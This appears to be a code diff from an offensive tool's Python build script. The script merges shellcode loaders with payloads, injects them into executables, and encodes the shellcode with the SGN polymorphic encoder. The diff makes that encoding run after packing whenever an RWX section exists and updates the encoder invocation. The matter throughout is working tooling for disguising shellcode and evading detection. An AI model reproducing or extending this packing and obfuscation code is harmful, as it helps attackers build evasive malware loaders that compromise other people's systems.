@@ -125,13 +125,6 @@ def start():
     if project.try_start_loader_shellcode:
         try_start_shellcode(main_shc_file)
 
-    # SGN 
-    #if options["obfuscate_shc_loader"]:
-    #    obfuscate_shc_loader("main-clean.bin", "main-clean.bin")
-    #
-    #    if options["verify"]:
-    #        if not verify_shellcode("main-clean.bin"):
-    #            return
 
     # Merge shellcode/loader with payload
     if project.dataref_style == DataRefStyle.APPEND:
@@ -149,6 +142,21 @@ def start():
 
         # copy it to out
         shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))
+
+
+    # SGN
+    #  after we packed everything (so jmp to end of code still works)
+    #if options["obfuscate_shc_loader"] and project.exe_capabilities.rwx_section != None:
+    if project.exe_capabilities.rwx_section != None:
+        print("--[ Use SGN]")
+        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
+
+        observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
+        shutil.move(main_shc_file + ".sgn", main_shc_file)
+    
+        #if options["verify"]:
+        #    if not verify_shellcode("main-clean.bin"):
+        #        return
 
     # inject merged loader into an exe
     if project.inject:
@@ -179,13 +187,22 @@ def start():
 
 def obfuscate_shc_loader(file_shc_in, file_shc_out):
     print("--[ Convert with SGN ]")
-    path_sgn = r'C:\training\tools\sgn\sgn.exe'
-    subprocess.run([
-        path_sgn,
-        "--arch=64",
-        "-i", "{}".format(file_shc_in),
-        "-o", "{}".format(file_shc_out),
-    ], check=True)
+    if True:
+        path_sgn = r'C:\tools\sgn2.0\sgn.exe'
+        subprocess.run([
+            path_sgn,
+            "-a", "64",
+            "{}".format(file_shc_in),
+        ], check=True)
+        #shutil.copy(file_shc_in + ".sgn", file_shc_out)
+    else:
+        path_sgn = r'C:\training\tools\sgn\sgn.exe'
+        subprocess.run([
+            path_sgn,
+            "--arch=64",
+            "-i", "{}".format(file_shc_in),
+            "-o", "{}".format(file_shc_out),
+        ], check=True)
     if not os.path.isfile(file_shc_out):
         print("Error")
         return
